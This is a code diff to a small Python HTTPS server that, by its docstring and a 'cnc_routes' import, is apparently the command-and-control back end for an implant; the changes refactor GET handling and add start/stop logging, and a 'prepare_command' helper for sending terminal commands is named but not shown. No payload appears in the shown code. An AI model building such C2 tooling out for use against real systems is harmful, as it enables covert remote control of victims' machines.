@@ -2,19 +2,21 @@
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl
-import json
-import subprocess
-from typing import ByteString
-from zlib import decompress
-from base64 import encodebytes, decodebytes
+import time
 from io import BytesIO
+from cnc_routes.main import routes
+# will eventually narrow down needed modules
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
-    """Using https://blog.anvileight.com/posts/simple-python-http-server/ as a starting point to handle requests from implant"""
+    """Using https://blog.anvileight.com/posts/simple-python-http-server/ as a starting point to handle requests from implant
+    and https://medium.com/@andrewklatzke/creating-a-python3-webserver-from-the-ground-up-4ff8933ecb96"""
+    
+    def do_HEAD(self):
+        return
+
     def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'Hello, lol')
+        self.respond()
+
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
@@ -26,6 +28,16 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         response.write(b'Received: ')
         response.write(body)
         self.wfile.write(response.getvalue())
+
+    def handle_http(self, status, content_type):
+        self.send_response(status)
+        self.send_header('Content-type', content_type)
+        self.end_headers()
+        return bytes("Hello, lol", "UTF-8")
+
+    def respond(self):
+        content = self.handle_http(200, 'text/html')
+        self.wfile.write(content)
 
 def prepare_command(command):
     """takes a terminal command and prepares it for consumption by implant
@@ -45,7 +57,16 @@ def main():
         keyfile="key.pem",
         certfile="cert.pem", server_side=True)
 
-    serv.serve_forever()
+    print(f"[+] {time.asctime()} -- Server UP on {server_address[0]}:{server_address[1]}")
+    try:
+        serv.serve_forever()
+    except KeyboardInterrupt: # When we manually kill the server,
+        pass                  # do so
+    serv.server_close()       # gracefully
+    print(f"[+] {time.asctime()} -- Server DOWN on {server_address[0]}:{server_address[1]}")
+
+
+
     
 
 if __name__ == "__main__":
